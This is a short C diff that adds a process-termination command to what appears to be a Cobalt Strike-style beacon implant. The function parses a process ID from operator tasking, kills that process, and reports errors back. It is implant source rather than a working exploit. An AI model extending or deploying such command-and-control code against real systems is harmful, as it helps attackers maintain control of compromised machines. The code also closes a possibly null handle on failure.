@@ -91,3 +91,16 @@ void ProcessList(char* buffer, int length) {
 cleanup:
 	BeaconFormatFree(&locals);
 }
+
+BOOL ProcessKill(char* buffer, int length) {
+	datap parser = { 0 };
+	BeaconDataParse(&parser, buffer, length);
+	int pid = BeaconDataInt(&parser);
+	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	if (!hProcess || !TerminateProcess(hProcess, 0)) {
+		int lastError = GetLastError();
+		LERROR("Could not kill %d: %s", pid, LAST_ERROR_STR(lastError));
+		BeaconErrorDD(ERROR_KILL_FAILED, pid, lastError);
+	}
+	return CloseHandle(hProcess);
+}
